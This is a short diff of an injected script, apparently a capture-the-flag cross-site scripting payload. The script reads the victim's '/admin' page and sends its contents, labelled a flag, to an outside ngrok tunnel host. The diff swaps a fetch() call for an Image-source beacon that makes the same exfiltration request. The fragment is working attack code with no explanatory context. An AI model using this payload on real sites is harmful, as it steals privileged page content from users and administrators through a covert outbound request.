@@ -2,7 +2,8 @@
 fetch('/admin')
   .then(res => res.text())
   .then(flag => {
-    fetch('https://unrebuked-remotely-franco.ngrok-free.dev/flag?flag=' + encodeURIComponent(flag));
+    var i = new Image();
+    i.src = 'https://unrebuked-remotely-franco.ngrok-free.dev/flag?flag=' + encodeURIComponent(flag);
   });
 </script>
 
